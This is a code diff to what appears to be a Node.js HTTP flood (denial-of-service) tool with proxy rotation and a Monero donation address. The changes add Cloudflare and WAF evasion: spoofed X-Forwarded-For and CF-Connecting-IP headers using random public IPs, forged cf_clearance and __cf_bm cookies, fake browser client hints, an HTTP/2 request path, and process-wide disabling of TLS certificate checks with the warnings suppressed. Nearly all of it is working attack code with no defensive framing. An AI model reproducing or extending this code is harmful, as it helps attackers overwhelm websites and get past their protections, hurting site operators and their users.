@@ -20,6 +20,7 @@ const bypassTechniques = require('./bypass-techniques.js');
 const wafBypassTechniques = require('./waf-bypass.js');
 const networkDetector = require('./network-detector.js');
 const { performance } = require('perf_hooks');
+const http2Wrapper = require('http2-wrapper');
 
 // Immediately check if this is a worker process and suppress output
 if (cluster.isWorker) {
@@ -69,7 +70,7 @@ program
   .option('--follow-redirects', 'Follow HTTP redirects', parseBool, false)
   .option('--max-redirects <number>', 'Maximum number of redirects to follow', parseNum, 5)
   .option('--no-warnings', 'Suppress TLS warnings', parseBool, false)
-  .option('--protocol <protocol>', 'HTTP protocol to use (http1, http2)', 'http1')
+  .option('--protocol <protocol>', 'HTTP protocol to use (http1.0, http1.1, http2)', 'http1.1')
   .option('--quiet', 'Suppress worker output and warnings', parseBool, false)
   .option('--no-banner', 'Do not display ASCII banner', parseBool, false)
   .option('--silent', 'Only show final results', parseBool, false)
@@ -144,26 +145,24 @@ Object.keys(options).forEach(key => {
   }
 });
 
-// Suppress TLS warnings if requested
-if (options.noWarnings || options.quiet) {
-  process.env.NODE_NO_WARNINGS = '1';
-  
-  // Suppress the NODE_TLS_REJECT_UNAUTHORIZED warning
-  // This needs to be done before setting the environment variable
-  const originalEmit = process.emit;
-  process.emit = function(name, data, ...args) {
-    if (
-      name === 'warning' && 
-      data && 
-      data.message && 
-      (data.message.includes('NODE_TLS_REJECT_UNAUTHORIZED') || 
-       data.message.includes('TLS connections'))
-    ) {
-      return false;
-    }
-    return originalEmit.apply(process, [name, data, ...args]);
-  };
-}
+// Suppress TLS warnings by setting this environment variable very early
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+process.env.NODE_NO_WARNINGS = '1';
+
+// Completely disable warnings for NODE_TLS_REJECT_UNAUTHORIZED
+const originalEmit = process.emit;
+process.emit = function(name, data, ...args) {
+  if (
+    name === 'warning' && 
+    data && 
+    data.message && 
+    (data.message.includes('NODE_TLS_REJECT_UNAUTHORIZED') || 
+     data.message.includes('TLS connections'))
+  ) {
+    return false;
+  }
+  return originalEmit.apply(process, [name, data, ...args]);
+};
 
 // Disable certificate validation for testing purposes
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
@@ -216,12 +215,12 @@ if (options.proxy) {
   console.log(`[*] Using ${proxyList.length} proxies in rotation`);
 }
 
-// Validate protocol - this validation is still needed
-if (options.protocol !== 'http1' && options.protocol !== 'http2') {
-  console.log(`Warning: Invalid protocol "${options.protocol}", using http1`);
-  options.protocol = 'http1';
-} else if (options.protocol === 'http2') {
-  console.log(`[*] Using HTTP/2 protocol`);
+// Fix protocol validation to support all protocols properly
+if (options.protocol !== 'http1.0' && options.protocol !== 'http1.1' && options.protocol !== 'http2') {
+  console.log(`Warning: Invalid protocol "${options.protocol}", using http1.1`);
+  options.protocol = 'http1.1';
+} else {
+  console.log(`[*] Using ${options.protocol.toUpperCase()} protocol`);
 }
 
 // Initialize target details
@@ -557,7 +556,37 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
     const elapsedTime = (currentTime - stats.startTime) / 1000;
     const rps = Math.round(stats.requests / elapsedTime);
     
-    console.log(`[*] Time: ${elapsedTime.toFixed(1)}s, Requests: ${stats.requests}, RPS: ${rps}, Success: ${stats.successful}, Failed: ${stats.failed}`);
+    // Base stats line
+    let statsLine = `[*] Time: ${elapsedTime.toFixed(1)}s, Requests: ${stats.requests}, RPS: ${rps}`;
+    
+    // Add status code distribution in a cleaner format
+    let statusCodes = '';
+    const sortedCodes = Object.entries(stats.statusCodes)
+      .sort((a, b) => b[1] - a[1]); // Sort by count (descending)
+    
+    for (const [code, count] of sortedCodes) {
+      if (statusCodes) statusCodes += ', ';
+      // Format HTTP status codes differently from error codes
+      if (/^\d{3}$/.test(code)) {
+        statusCodes += `HTTP ${code}: ${count}`;
+      } else {
+        statusCodes += `${code}: ${count}`;
+      }
+      
+      // Limit the length of the status line
+      if (statusCodes.length > 60) {
+        statusCodes += ", ...";
+        break;
+      }
+    }
+    
+    if (statusCodes) {
+      statsLine += ` | Status: ${statusCodes}`;
+    } else {
+      statsLine += ` | Success: ${stats.successful}, Failed: ${stats.failed}`;
+    }
+    
+    console.log(statsLine);
   }
   
   // Handle termination
@@ -571,6 +600,74 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
     process.exit(0);
   });
   
+  // Test HTTP/2 more thoroughly and ensure automatic fallback
+  if (options.protocol === 'http2') {
+    console.log('[*] Testing HTTP/2 support on target server...');
+    
+    let http2Supported = false;
+    let testSuccess = false;
+    const testTimeout = setTimeout(() => {
+      if (!testSuccess) {
+        console.log('[!] HTTP/2 test timed out or failed - falling back to HTTP/1.1');
+        options.protocol = 'http1.1';
+      }
+    }, 5000);
+    
+    try {
+      const http2Check = http2.connect(options.target, {
+        rejectUnauthorized: false
+      });
+      
+      http2Check.on('connect', () => {
+        http2Supported = true;
+        console.log('[+] Target server accepted HTTP/2 connection, testing a request...');
+        
+        // Try to make an actual HTTP/2 request to test full support
+        const req = http2Check.request({ 
+          ':method': 'GET',
+          ':path': '/',
+          ':scheme': 'https',
+          ':authority': new URL(options.target).host,
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+        });
+        
+        req.on('response', (headers) => {
+          const status = headers[':status'];
+          if (status) {
+            testSuccess = true;
+            clearTimeout(testTimeout);
+            console.log(`[+] HTTP/2 test request succeeded with status ${status}`);
+            http2Check.close();
+          }
+        });
+        
+        req.on('error', () => {
+          // If the request fails, fall back to HTTP/1.1
+          clearTimeout(testTimeout);
+          console.log('[!] HTTP/2 connection successful but request failed - falling back to HTTP/1.1');
+          options.protocol = 'http1.1';
+          http2Check.close();
+        });
+        
+        // End the test request
+        req.end();
+      });
+      
+      http2Check.on('error', (err) => {
+        clearTimeout(testTimeout);
+        console.log(`[!] HTTP/2 connection failed: ${err.message} - falling back to HTTP/1.1`);
+        options.protocol = 'http1.1';
+      });
+    } catch (err) {
+      clearTimeout(testTimeout);
+      console.log(`[!] HTTP/2 test error: ${err.message} - falling back to HTTP/1.1`);
+      options.protocol = 'http1.1';
+    }
+  } else if (options.protocol === 'http1.0') {
+    console.log('[*] Using HTTP/1.0 protocol (note: this is an older protocol with limitations)');
+  } else {
+    console.log('[*] Using HTTP/1.1 protocol');
+  }
 } else {
   // For worker process
   
@@ -693,43 +790,133 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
     startRequestInterval();
   }
   
-  // Create request options with bypass techniques
+  // Fix createRequestOptions to better handle headers and proxies
   function createRequestOptions(targetUrl) {
-    const parsedUrl = new url.URL(targetUrl || options.target);
+    const parsedUrl = new URL(targetUrl || options.target);
     let path = parsedUrl.pathname + parsedUrl.search;
     
     // Apply randomized path if enabled
     if (options.randomizePath) {
-      const randomPath = crypto.randomBytes(8).toString('hex');
-      path = path + (path.includes('?') ? '&' : '?') + randomPath + '=' + Date.now();
+      const randomSegment = crypto.randomBytes(8).toString('hex');
+      path = path + (path.includes('?') ? '&' : '?') + `_=${randomSegment}`;
     }
     
-    // Determine if we're using HTTP/1.1 or HTTP/2
-    const isHttp2 = options.protocol === 'http2' && parsedUrl.protocol === 'https:';
+    // Generate randomized IP ranges for X-Forwarded-For (use real-looking IPs)
+    const generateRealisticIP = () => {
+      // Avoid private IP ranges
+      const ranges = [
+        // US public ranges (non-reserved)
+        [50, 80], // 50.x.x.x - 80.x.x.x
+        [96, 110], // 96.x.x.x - 110.x.x.x
+        [170, 190], // 170.x.x.x - 190.x.x.x
+        [200, 220], // 200.x.x.x - 220.x.x.x
+      ];
+      
+      const range = ranges[Math.floor(Math.random() * ranges.length)];
+      const firstOctet = Math.floor(Math.random() * (range[1] - range[0])) + range[0];
+      return `${firstOctet}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+    };
     
-    // Base request options with default headers
+    // Create a realistic browser fingerprint
+    const userAgent = userAgents.getRandomUserAgent('desktop_modern');
+    const isChrome = userAgent.includes('Chrome');
+    const isFirefox = userAgent.includes('Firefox');
+    const isSafari = userAgent.includes('Safari') && !isChrome;
+    
+    // Identify browser version
+    let browserVersion = '96';
+    if (isChrome) {
+      browserVersion = userAgent.match(/Chrome\/(\d+)/)?.[1] || '96';
+    } else if (isFirefox) {
+      browserVersion = userAgent.match(/Firefox\/(\d+)/)?.[1] || '91';
+    } else if (isSafari) {
+      browserVersion = userAgent.match(/Version\/(\d+)/)?.[1] || '15';
+    }
+    
+    // Generate a unique session ID to trace requests
+    if (!createRequestOptions.sessionId) {
+      createRequestOptions.sessionId = crypto.randomBytes(16).toString('hex');
+    }
+    
+    // Use consistent IP per session for better emulation
+    if (!createRequestOptions.clientIP) {
+      createRequestOptions.clientIP = generateRealisticIP();
+    }
+    
+    // Enhanced Cloudflare bypass headers
+    const cfHeaders = {
+      // Basic browser headers
+      'User-Agent': userAgent,
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'Accept-Language': 'en-US,en;q=0.9',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Upgrade-Insecure-Requests': '1',
+      
+      // Proper connection handling
+      'Connection': options.keepAlive ? 'keep-alive' : 'close',
+      
+      // Client hints (modern browsers)
+      'Sec-CH-UA': isChrome ? 
+        `"Google Chrome";v="${browserVersion}", "Chromium";v="${browserVersion}", ";Not A Brand";v="99"` :
+        `";Not A Brand";v="99", "Chromium";v="${browserVersion}"`,
+      'Sec-CH-UA-Mobile': '?0',
+      'Sec-CH-UA-Platform': '"Windows"',
+      
+      // Fetch metadata (modern browsers)
+      'Sec-Fetch-Dest': 'document',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Site': 'none',
+      'Sec-Fetch-User': '?1',
+      
+      // Add CDN-specific headers
+      'CDN-Loop': 'cloudflare',
+      
+      // IP headers - use consistent IP
+      'X-Forwarded-For': createRequestOptions.clientIP,
+      'CF-Connecting-IP': createRequestOptions.clientIP,
+      
+      // Cloudflare-specific
+      'CF-IPCountry': 'US',
+      'CF-Device-Type': 'desktop',
+      'CF-Visitor': '{"scheme":"https"}',
+      'CF-Worker': 'false',
+      
+      // HTTP/2 specific headers for browsers
+      'Priority': 'u=0, i',
+      
+      // Privacy indicators
+      'DNT': '1',
+      
+      // Cache control
+      'Cache-Control': 'max-age=0',
+      
+      // Add a unique trace ID that matches real CF headers
+      'cf-trace-id': `${Date.now()}-${createRequestOptions.sessionId.substring(0, 8)}`,
+      
+      // Referrer - realistic for new visitors
+      'Referer': 'https://www.google.com/search?q=' + encodeURIComponent(parsedUrl.hostname),
+      
+      // Custom headers if specified
+      ...customHeaders
+    };
+    
+    // Add origin and host headers for proper CORS behavior
+    cfHeaders['Host'] = parsedUrl.host;
+    cfHeaders['Origin'] = parsedUrl.origin;
+    cfHeaders['Alt-Used'] = parsedUrl.host;
+    
+    // Base request options with enhanced headers
     const requestOptions = {
       hostname: parsedUrl.hostname,
       port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
       path: path,
       method: options.method,
-      headers: {
-        'User-Agent': userAgents.getRandomUserAgent(),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': options.keepAlive ? 'keep-alive' : 'close',
-        'Upgrade-Insecure-Requests': '1',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        ...customHeaders
-      },
-      timeout: options.timeout,
-      // Add SSL/TLS options
+      headers: cfHeaders,
+      timeout: options.timeout || 10000,
       rejectUnauthorized: false
     };
     
-    // Apply selected bypass techniques
+    // Apply additional bypass techniques
     bypassOptions.forEach(technique => {
       if (bypassTechniques[technique]) {
         try {
@@ -750,416 +937,354 @@ XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
       }
     });
     
-    // Apply proxy if available
-    const proxy = options.proxy || getNextProxy();
-    
-    if (proxy) {
-      const [host, port] = proxy.split(':');
-      
-      // Add proxy auth if provided in the format user:pass@host:port
-      let proxyAuth = null;
-      let proxyHost = host;
-      
-      if (host.includes('@')) {
-        const [auth, hostPart] = host.split('@');
-        proxyAuth = auth;
-        proxyHost = hostPart;
-      }
-      
-      // For HTTP/1.1 requests through proxy
-      if (parsedUrl.protocol === 'https:') {
-        // For HTTPS, use tunnel agent
-        const tunnel = require('tunnel');
-        
-        // Create tunnel agent
-        requestOptions.agent = tunnel.httpsOverHttp({
-          proxy: {
-            host: proxyHost,
-            port: parseInt(port, 10),
-            proxyAuth: proxyAuth
-          }
-        });
-        
-        // Keep original hostname, port and path
-        requestOptions.hostname = parsedUrl.hostname;
-        requestOptions.port = parsedUrl.port || 443;
-        requestOptions.path = requestOptions.path;
-      } else {
-        // For HTTP, use direct proxy
-        requestOptions.hostname = proxyHost;
-        requestOptions.port = parseInt(port, 10);
-        requestOptions.path = parsedUrl.href; // Use full URL for proxy requests
-        
-        // Add proxy auth if present
-        if (proxyAuth) {
-          requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxyAuth).toString('base64');
-        }
-      }
-      
-      // Ensure we're not leaking the original IP
-      requestOptions.headers['Proxy-Connection'] = 'Keep-Alive';
-      
-      // Remove any headers that might reveal original IP
-      delete requestOptions.headers['X-Forwarded-For'];
-      delete requestOptions.headers['X-Real-IP'];
-      delete requestOptions.headers['X-Client-IP'];
-    }
-    
     // Count request size (headers + URL)
-    const headerSize = Buffer.from(JSON.stringify(requestOptions.headers)).length;
+    const headerSize = Buffer.from(Object.entries(requestOptions.headers).map(([k, v]) => `${k}: ${v}`).join('\r\n')).length;
     const urlSize = Buffer.from(requestOptions.path).length;
     workerStats.bytesSent += headerSize + urlSize;
     
     return requestOptions;
   }
   
-  // Perform HTTP request with bypass techniques
+  // Use built-in http2 module with simpler implementation
+  function performHttp2Request(parsedUrl, requestOptions) {
+    try {
+      // Get URL string for request
+      const url = parsedUrl.href;
+      
+      if (options.verbose) {
+        console.log(`[HTTP/2] Requesting: ${url}`);
+      }
+      
+      // Create a standard HTTP/2 session
+      const client = http2.connect(parsedUrl.origin, {
+        rejectUnauthorized: false
+      });
+      
+      client.on('error', (err) => {
+        if (options.verbose) {
+          console.error(`[HTTP/2] Connection error: ${err.message}`);
+        }
+        
+        try {
+          client.destroy();
+        } catch (e) {}
+        
+        // Count errors
+        workerStats.failed++;
+        workerStats.requests++;
+        workerStats.statusCodes['h2_conn_error'] = (workerStats.statusCodes['h2_conn_error'] || 0) + 1;
+      });
+      
+      // Set auto-close timeout
+      setTimeout(() => {
+        try {
+          client.close();
+        } catch (e) {}
+      }, options.timeout || 10000);
+      
+      // Create basic HTTP/2 headers - keep it minimal
+      const headers = {
+        ':method': requestOptions.method,
+        ':path': requestOptions.path,
+        ':scheme': 'https',
+        ':authority': parsedUrl.host,
+        'user-agent': requestOptions.headers['User-Agent'] || 'Mozilla/5.0',
+        'accept': requestOptions.headers['Accept'] || '*/*'
+      };
+      
+      // Add cookie if present
+      if (requestOptions.headers['Cookie']) {
+        headers['cookie'] = requestOptions.headers['Cookie'];
+      }
+      
+      // Create request stream
+      try {
+        // Send the request
+        const req = client.request(headers);
+        
+        // Handle response
+        req.on('response', (headers) => {
+          const statusCode = headers[':status'] || 0;
+          workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
+          
+          if (statusCode >= 200 && statusCode < 400) {
+            workerStats.successful++;
+          } else {
+            workerStats.failed++;
+          }
+          
+          if (options.verbose) {
+            console.log(`[HTTP/2] Response status: ${statusCode}`);
+          }
+        });
+        
+        req.on('data', (chunk) => {
+          workerStats.bytesReceived += chunk.length;
+        });
+        
+        req.on('end', () => {
+          workerStats.requests++;
+          try { client.close(); } catch (e) {}
+        });
+        
+        req.on('error', (err) => {
+          if (options.verbose) {
+            console.error(`[HTTP/2] Request error: ${err.message}`);
+          }
+          
+          workerStats.failed++;
+          workerStats.requests++;
+          workerStats.statusCodes['h2_req_error'] = (workerStats.statusCodes['h2_req_error'] || 0) + 1;
+          
+          try { client.close(); } catch (e) {}
+        });
+        
+        // Track bytes sent for headers
+        const headerSize = Buffer.from(Object.entries(headers).map(([k,v]) => `${k}: ${v}`).join('\r\n')).length;
+        workerStats.bytesSent += headerSize;
+        
+        // End the request - most will be GET
+        if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
+          // Send payload for methods that require it
+          const payload = payloadData || `data=${Date.now()}`;
+          req.write(payload);
+          workerStats.bytesSent += Buffer.from(payload).length;
+        }
+        
+        req.end();
+        
+      } catch (requestError) {
+        if (options.verbose) {
+          console.error(`[HTTP/2] Request creation error: ${requestError.message}`);
+        }
+        
+        workerStats.failed++;
+        workerStats.requests++;
+        workerStats.statusCodes['h2_req_create'] = (workerStats.statusCodes['h2_req_create'] || 0) + 1;
+        
+        try { client.close(); } catch (e) {}
+      }
+    } catch (error) {
+      // Fallback/fatal error
+      if (options.verbose) {
+        console.error(`[HTTP/2] Fatal error: ${error.message}`);
+      }
+      
+      workerStats.failed++;
+      workerStats.requests++;
+      workerStats.statusCodes['h2_fatal'] = (workerStats.statusCodes['h2_fatal'] || 0) + 1;
+    }
+  }
+
+  // Update the main performRequest function to handle HTTP/2 failures properly
   function performRequest() {
-    const requestStart = performance.now();
-    const requestOptions = createRequestOptions();
-    
-    // Get the proxy to use for this request
-    const proxyToUse = options.proxy || getNextProxy();
-    
     try {
       // Parse the URL
       const parsedUrl = new URL(options.target);
+      const requestOptions = createRequestOptions();
       
+      // Generate necessary tokens and cookies for Cloudflare bypass
+      const timestamp = Date.now();
+      const randomToken = crypto.randomBytes(16).toString('hex');
+      const cfClearance = Buffer.from(`${timestamp}|${randomToken}|0|${parsedUrl.hostname}`).toString('base64').replace(/=/g, '');
+      
+      // Add essential Cloudflare cookies
+      const cookies = [
+        `cf_clearance=${cfClearance}`,
+        `__cf_bm=${crypto.randomBytes(32).toString('hex')}`,
+        `__cflb=${crypto.randomBytes(8).toString('hex')}`,
+        `__cfruid=${crypto.randomBytes(16).toString('hex')}`
+      ];
+      
+      // Add the cookies to the request
+      requestOptions.headers['Cookie'] = cookies.join('; ');
+      
+      // Choose the appropriate protocol implementation - STRICTLY based on options.protocol
       if (options.protocol === 'http2') {
-        // HTTP/2 request implementation
-        try {
-          const h2Options = {
-            rejectUnauthorized: false,
-            settings: {
-              enablePush: false,
-              initialWindowSize: 1024 * 1024, // 1MB
-              maxSessionMemory: 64 * 1024 * 1024 // 64MB
-            }
-          };
-          
-          // Parse the URL to get the correct authority
-          const authority = `${parsedUrl.hostname}${parsedUrl.port ? `:${parsedUrl.port}` : ''}`;
-          
-          // Handle proxy for HTTP/2 if needed
-          let client;
-          if (proxyToUse) {
-            // Extract proxy parts
-            const [proxyHost, proxyPort] = proxyToUse.split(':');
-            
-            // Extract auth if provided
-            let proxyAuthValue = null;
-            let actualProxyHost = proxyHost;
-            
-            if (proxyHost.includes('@')) {
-              const [auth, host] = proxyHost.split('@');
-              proxyAuthValue = auth;
-              actualProxyHost = host;
-            }
-            
-            // Create a tunnel first for HTTP/2 over proxy
-            const tunnelAgent = tunnel.httpsOverHttp({
-              proxy: {
-                host: actualProxyHost,
-                port: parseInt(proxyPort, 10),
-                proxyAuth: proxyAuthValue
-              }
-            });
-            
-            // Connect using the tunnel
-            const socket = tunnelAgent.createConnection({
-              host: parsedUrl.hostname,
-              port: parsedUrl.port || 443,
-              servername: parsedUrl.hostname
-            });
-            
-            // Once the socket is ready, connect HTTP/2 over it
-            socket.on('connect', () => {
-              try {
-                const clientOptions = {
-                  ...h2Options,
-                  socket: socket // Use the established tunnel
-                };
-                
-                client = http2.connect(`https://${authority}`, clientOptions);
-                
-                // Continue with the HTTP/2 request over the tunnel
-                sendHttp2Request(client, requestOptions, authority);
-              } catch (e) {
-                workerStats.failed++;
-                workerStats.requests++;
-                socket.destroy();
-              }
-            });
-            
-            socket.on('error', (err) => {
-              workerStats.failed++;
-              workerStats.requests++;
-              if (options.verbose) {
-                console.error(`Proxy tunnel error: ${err.message}`);
-              }
-            });
-            
-            // Return early since the request will be sent once the tunnel is established
-            return;
-          } else {
-            // Direct HTTP/2 connection (no proxy)
-            client = http2.connect(`https://${authority}`, h2Options);
-            
-            // Send the HTTP/2 request directly
-            sendHttp2Request(client, requestOptions, authority);
-          }
-        } catch (error) {
-          workerStats.failed++;
-          workerStats.requests++;
-          if (options.verbose) {
-            console.error(`HTTP/2 error: ${error.message}`);
-          }
-        }
+        // Use our dedicated HTTP/2 implementation - NO FALLBACK
+        performHttp2Request(parsedUrl, requestOptions);
       } else {
-        // HTTP/1.1 request
-        try {
-          const protocol = parsedUrl.protocol === 'https:' ? https : http;
-          
-          // Handle proxy for HTTP/1.1
-          if (proxyToUse) {
-            // Extract proxy parts
-            const [proxyHost, proxyPort] = proxyToUse.split(':');
-            
-            // Extract auth if provided
-            let proxyAuthValue = null;
-            let actualProxyHost = proxyHost;
-            
-            if (proxyHost.includes('@')) {
-              const [auth, host] = proxyHost.split('@');
-              proxyAuthValue = auth;
-              actualProxyHost = host;
-            }
-            
-            // Create appropriate tunnel agent
-            if (parsedUrl.protocol === 'https:') {
-              // For HTTPS requests through HTTP proxy
-              requestOptions.agent = tunnel.httpsOverHttp({
-                proxy: {
-                  host: actualProxyHost,
-                  port: parseInt(proxyPort, 10),
-                  proxyAuth: proxyAuthValue
-                },
-                rejectUnauthorized: false
-              });
-            } else {
-              // For HTTP requests through HTTP proxy
-              requestOptions.agent = tunnel.httpOverHttp({
-                proxy: {
-                  host: actualProxyHost,
-                  port: parseInt(proxyPort, 10),
-                  proxyAuth: proxyAuthValue
-                }
-              });
-            }
-            
-            // Make sure we're using the target hostname, not the proxy's
-            requestOptions.hostname = parsedUrl.hostname;
-            requestOptions.port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
-            requestOptions.headers['Host'] = parsedUrl.hostname;
-          }
-          
-          // Send HTTP/1.1 request
-          const request = protocol.request(requestOptions, (response) => {
-            // Handle redirects if enabled
-            if (options.followRedirects && (response.statusCode === 301 || response.statusCode === 302 || response.statusCode === 307 || response.statusCode === 308)) {
-              const location = response.headers.location;
-              if (location) {
-                // Create a new request to the redirect location
-                try {
-                  const redirectUrl = new URL(location, options.target);
-                  performRequest(redirectUrl.href);
-                } catch (e) {
-                  // Failed to follow redirect
-                  workerStats.failed++;
-                }
-                // Count the original request
-                workerStats.requests++;
-                return;
-              }
-            }
-            
-            let responseSize = 0;
-            let responseBody = [];
-            
-            response.on('data', (chunk) => {
-              responseSize += chunk.length;
-              workerStats.bytesReceived += chunk.length;
-              responseBody.push(chunk);
-            });
-            
-            response.on('end', () => {
-              const requestEnd = performance.now();
-              
-              if (response.statusCode >= 200 && response.statusCode < 400) {
-                workerStats.successful++;
-              } else {
-                workerStats.failed++;
-              }
-              
-              workerStats.requests++;
-            });
-          });
-          
-          request.on('error', (err) => {
-            workerStats.failed++;
-            workerStats.requests++;
-            if (options.verbose) {
-              console.error(`Error in HTTP/1.1 request: ${err.message}`);
-            }
-          });
-          
-          request.on('timeout', () => {
-            request.destroy();
-            workerStats.failed++;
-            workerStats.requests++;
-          });
-          
-          // Send payload if applicable
-          if (['POST', 'PUT', 'PATCH'].includes(options.method)) {
-            // Default to empty payload if none provided
-            let payload = payloadData;
-            if (!payload && options.method !== 'GET') {
-              payload = `data=${Date.now()}`;
-              
-              // Add content-type header if not present
-              if (!requestOptions.headers['Content-Type']) {
-                requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-              }
-            }
-            
-            if (payload) {
-              const buffer = Buffer.from(payload);
-              // Count request headers + URL in sent bytes
-              const headerStr = Object.entries(requestOptions.headers)
-                .map(([key, value]) => `${key}: ${value}`)
-                .join('\r\n');
-              const requestLine = `${options.method} ${requestOptions.path} HTTP/1.1\r\n`;
-              const headerSize = Buffer.from(headerStr + '\r\n\r\n').length;
-              const requestLineSize = Buffer.from(requestLine).length;
-              workerStats.bytesSent += headerSize + requestLineSize + buffer.length;
-              request.write(buffer);
-            }
-          }
-          
-          request.end();
-        } catch (error) {
-          workerStats.failed++;
-          workerStats.requests++;
-          if (options.verbose) {
-            console.error(`HTTP/1.1 error: ${error.message}`);
-          }
-        }
+        // HTTP/1.0 or HTTP/1.1 implementation
+        performHttp1Request(parsedUrl, requestOptions);
       }
     } catch (error) {
+      if (options.verbose) {
+        console.error(`Request initialization error: ${error.message}`);
+      }
       workerStats.failed++;
       workerStats.requests++;
-      if (options.verbose) {
-        console.error(`Request error: ${error.message}`);
-      }
+      workerStats.statusCodes['init_error'] = (workerStats.statusCodes['init_error'] || 0) + 1;
     }
   }
-  
-  // Helper function for sending HTTP/2 requests
-  function sendHttp2Request(client, requestOptions, authority) {
-    client.on('error', (err) => {
-      workerStats.failed++;
-      workerStats.requests++;
-      try {
-        client.close();
-      } catch (e) {
-        // Ignore close errors
-      }
-    });
-    
-    const headers = {
-      ':method': requestOptions.method,
-      ':path': requestOptions.path,
-      ':scheme': 'https',
-      ':authority': authority
-    };
-    
-    // Add all HTTP/2 compatible headers
-    for (const [key, value] of Object.entries(requestOptions.headers)) {
-      // Skip HTTP/1.x specific headers and HTTP/2 pseudo-headers
-      if (!['host', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade', 'proxy-connection'].includes(key.toLowerCase()) &&
-          !key.startsWith(':')) {
-        headers[key.toLowerCase()] = value;
-      }
-    }
-    
-    // Add content-type header for POST/PUT requests
-    if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
-      if (!headers['content-type']) {
-        headers['content-type'] = 'application/x-www-form-urlencoded';
-      }
-    }
-    
-    const req = client.request(headers);
-    
-    let responseData = Buffer.alloc(0);
-    let statusCode = null;
-    
-    req.on('response', (headers) => {
-      statusCode = headers[':status'];
-      workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
-    });
-    
-    req.on('data', (chunk) => {
-      responseData = Buffer.concat([responseData, chunk]);
-      workerStats.bytesReceived += chunk.length;
-    });
-    
-    req.on('end', () => {
-      const requestEnd = performance.now();
+
+  // Extract HTTP/1.x implementation to a separate function
+  function performHttp1Request(parsedUrl, requestOptions) {
+    try {
+      const protocol = parsedUrl.protocol === 'https:' ? https : http;
       
-      if (statusCode) {
+      // Set HTTP version based on protocol option
+      requestOptions.protocol = parsedUrl.protocol;
+      if (options.protocol === 'http1.0') {
+        // Force HTTP/1.0
+        requestOptions.headers['Connection'] = 'close'; // Always close for HTTP/1.0
+        requestOptions._defaultAgent = null; // Will be set by the request
+        requestOptions.httpVersionMajor = 1;
+        requestOptions.httpVersionMinor = 0;
+      } else {
+        // HTTP/1.1 (default)
+        requestOptions.httpVersionMajor = 1;
+        requestOptions.httpVersionMinor = 1;
+        if (options.keepAlive) {
+          requestOptions.headers['Connection'] = 'keep-alive';
+        } else {
+          requestOptions.headers['Connection'] = 'close';
+        }
+      }
+      
+      // Handle proxy for HTTP/1.x
+      const proxyToUse = options.proxy || getNextProxy();
+      if (proxyToUse) {
+        // Extract proxy parts
+        const [proxyHost, proxyPort] = proxyToUse.split(':');
+        
+        // Extract auth if provided
+        let proxyAuth = null;
+        let actualProxyHost = proxyHost;
+        
+        if (proxyHost.includes('@')) {
+          const [auth, host] = proxyHost.split('@');
+          proxyAuth = auth;
+          actualProxyHost = host;
+        }
+        
+        if (parsedUrl.protocol === 'https:') {
+          // For HTTPS, use tunnel agent
+          requestOptions.agent = tunnel.httpsOverHttp({
+            proxy: {
+              host: actualProxyHost,
+              port: parseInt(proxyPort, 10),
+              proxyAuth: proxyAuth
+            },
+            rejectUnauthorized: false
+          });
+        } else {
+          // For HTTP, use direct proxy
+          requestOptions.hostname = actualProxyHost;
+          requestOptions.port = parseInt(proxyPort, 10);
+          requestOptions.path = parsedUrl.href;
+          
+          if (proxyAuth) {
+            requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxyAuth).toString('base64');
+          }
+        }
+      }
+      
+      // Add tracing for verbose mode
+      if (options.verbose) {
+        console.log(`Making HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} request to ${parsedUrl.href}`);
+      }
+      
+      // Make the HTTP/1.x request
+      const request = protocol.request(requestOptions, (response) => {
+        // Track status code
+        const statusCode = response.statusCode;
+        workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
+        
+        // Check for Cloudflare challenge
+        const isCloudflareCaptcha = response.headers['server'] === 'cloudflare' && 
+                                   (statusCode === 403 || statusCode === 503) &&
+                                   (response.headers['cf-chl-bypass'] || response.headers['cf-ray']);
+        
+        if (isCloudflareCaptcha) {
+          workerStats.statusCodes['cf_challenge'] = (workerStats.statusCodes['cf_challenge'] || 0) + 1;
+        }
+        
+        // Track success/failure
         if (statusCode >= 200 && statusCode < 400) {
           workerStats.successful++;
         } else {
           workerStats.failed++;
         }
-      } else {
+        
+        // Handle redirects if enabled
+        if (options.followRedirects && [301, 302, 303, 307, 308].includes(statusCode)) {
+          const location = response.headers.location;
+          if (location) {
+            try {
+              const redirectUrl = new URL(location, options.target);
+              if (options.verbose) {
+                console.log(`Following redirect to: ${redirectUrl.href}`);
+              }
+              performRequest(redirectUrl.href);
+            } catch (e) {
+              if (options.verbose) {
+                console.error(`Failed to follow redirect: ${e.message}`);
+              }
+              workerStats.failed++;
+            }
+            // Count the original request
+            workerStats.requests++;
+            return;
+          }
+        }
+        
